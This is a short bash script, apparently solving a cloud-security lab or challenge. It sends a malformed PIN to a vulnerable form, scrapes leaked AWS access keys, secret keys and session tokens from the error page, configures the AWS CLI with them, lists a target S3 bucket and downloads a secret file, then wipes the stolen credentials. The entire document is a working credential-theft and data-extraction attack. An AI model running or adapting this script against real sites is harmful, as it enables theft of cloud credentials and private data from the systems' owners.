#!/bin/bash 
 
# Send a request to the vulnerable form with a non-number parameter 
response=$(curl -s -X POST http://vulnerable-site.com/form -d "pin=non-number") 
 
# Extract sensitive data from the error message 
secret_key=$(echo "$response" | grep -oP 'Secret Key: \K\S+') 
access_key=$(echo "$response" | grep -oP 'Access ID: \K\S+') 
session_id=$(echo "$response" | grep -oP 'Session ID: \K\S+') 
 
# Configure AWS CLI with extracted credentials 
aws configure set aws_access_key_id "$access_key" 
aws configure set aws_secret_access_key "$secret_key" 
aws configure set aws_session_token "$session_id" 
 
# List files and directories using AWS CLI 
aws s3 ls s3://target-bucket/ 
 
# Output the secret file 
aws s3 cp s3://target-bucket/secret-file . 
 
# Clean up credentials 
aws configure unset aws_access_key_id 
aws configure unset aws_secret_access_key 
aws configure unset aws_session_token 




# Simple bash script to automate tasks in a cloud flaw website - there were dumped environment variables and this continaed
# sensitive data like access keys, secret keys and session keys. 
